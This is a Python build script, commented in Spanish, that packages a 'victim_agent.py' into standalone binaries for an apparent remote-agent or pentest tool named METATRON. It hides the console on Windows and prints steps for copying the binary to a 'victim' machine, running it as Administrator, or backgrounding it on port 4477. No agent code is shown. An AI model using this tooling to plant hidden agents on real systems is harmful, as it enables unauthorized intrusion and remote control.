#!/usr/bin/env python3
"""
build_agent.py - Compila victim_agent.py a binario standalone con PyInstaller.

Uso:
    python build_agent.py                # Compila para la plataforma actual
    python build_agent.py --all          # Compila para Win + Linux (requiere WINE o se ejecuta en cada SO)
    python build_agent.py --clean        # Limpia dist/ y build/ previos

Genera:
    dist/metatron-agent-windows-x64.exe   (en Windows)
    dist/metatron-agent-linux-x64          (en Linux)

Los binarios son standalone (~10MB), no requieren Python instalado en la víctima.
"""
import os
import sys
import shutil
import subprocess
import platform
from pathlib import Path

HERE = Path(__file__).parent
AGENT_SRC = HERE / "victim_agent.py"
DIST = HERE / "dist"
BUILD = HERE / "build"
SPEC = HERE / "metatron-agent.spec"


def check_pyinstaller() -> bool:
    try:
        import PyInstaller
        return True
    except ImportError:
        return False


def install_pyinstaller() -> bool:
    print("[*] Instalando PyInstaller...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        return True
    except Exception as e:
        print(f"[!] Error instalando PyInstaller: {e}")
        return False


def clean():
    print("[*] Limpiando builds previos...")
    if DIST.exists():
        shutil.rmtree(DIST, ignore_errors=True)
    if BUILD.exists():
        shutil.rmtree(BUILD, ignore_errors=True)
    if SPEC.exists():
        SPEC.unlink()
    print("[*] Limpieza completa")


def build_one(system: str) -> str:
    """Compila el agente para el sistema dado. Devuelve la ruta al binario."""
    if not AGENT_SRC.exists():
        raise FileNotFoundError(f"No se encuentra {AGENT_SRC}")
    
    if system == "windows":
        out_name = "metatron-agent-windows-x64.exe"
    elif system == "linux":
        out_name = "metatron-agent-linux-x64"
    else:
        raise ValueError(f"Sistema no soportado: {system}")
    
    DIST.mkdir(exist_ok=True)
    
    print(f"\n[*] Compilando para {system.upper()}...")
    print(f"    Source: {AGENT_SRC}")
    print(f"    Output: {DIST / out_name}")
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",                          # Un solo binario (todo embebido)
        "--noconfirm",                        # Sobrescribir sin preguntar
        "--clean",                            # Limpia cache de PyInstaller
        "--name", out_name.replace(".exe", ""),  # Nombre sin extensión
        "--distpath", str(DIST),
        "--workpath", str(BUILD),
        "--specpath", str(HERE),
        "--strip",                            # Reduce tamaño (Linux/macOS)
        # Sin konsola (modo silencioso en Windows)
        # Nota: dejamos consola para Linux porque necesitamos stdout por si algo falla
    ]
    
    # En Windows, ocultar la consola (--windowed) para que no aparezca un cmd negro
    if system == "windows":
        cmd.append("--windowed")
    
    # Archivo principal
    cmd.append(str(AGENT_SRC))
    
    print(f"    CMD: {' '.join(cmd[:5])} ... {cmd[-1]}")
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("[*] Build exitoso")
    except subprocess.CalledProcessError as e:
        print(f"[!] BUILD FALLIDO")
        print(f"    STDOUT: {e.stdout[-2000:] if e.stdout else '(vacio)'}")
        print(f"    STDERR: {e.stderr[-2000:] if e.stderr else '(vacio)'}")
        raise
    
    out_path = DIST / out_name
    if out_path.exists():
        size_mb = out_path.stat().st_size / (1024 * 1024)
        print(f"    Tamaño: {size_mb:.1f} MB")
        return str(out_path)
    else:
        raise RuntimeError(f"Build salió OK pero no encontré el binario en {out_path}")


def get_current_system() -> str:
    if platform.system().lower().startswith("win"):
        return "windows"
    elif platform.system().lower().startswith("linux"):
        return "linux"
    else:
        print(f"[!] Plataforma no soportada: {platform.system()}")
        sys.exit(1)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Compila victim_agent.py a binario standalone")
    parser.add_argument("--all", action="store_true", help="Compila para Win + Linux (debes ejecutar en cada SO)")
    parser.add_argument("--clean", action="store_true", help="Limpia builds previos")
    parser.add_argument("--system", choices=["windows", "linux"], help="Sistema destino forzado")
    args = parser.parse_args()
    
    print("=" * 60)
    print("  METATRON Agent Builder (PyInstaller)")
    print("=" * 60)
    
    if args.clean:
        clean()
    
    if not check_pyinstaller():
        if not install_pyinstaller():
            print("[!] No se pudo instalar PyInstaller. Abortando.")
            sys.exit(1)
    
    if args.system:
        system = args.system
    elif args.all:
        system = get_current_system()
        print(f"[*] Compilando para SO actual ({system}). Para el otro SO, ejecutá este script en esa plataforma.")
    else:
        system = get_current_system()
    
    bin_path = build_one(system)
    
    print("\n" + "=" * 60)
    print(f"  BUILD COMPLETADO")
    print(f"  Binario: {bin_path}")
    print("=" * 60)
    print("\nProximos pasos:")
    print(f"  1. Copiar {bin_path} a la máquina víctima")
    print(f"  2. En Windows: ejecutar como Administrator")
    print(f"  3. En Linux: chmod +x && nohup ./binario --port 4477 &")
    print(f"  4. O usar el botón 'Desplegar agente' del Explorador en METATRON")


if __name__ == "__main__":
    main()
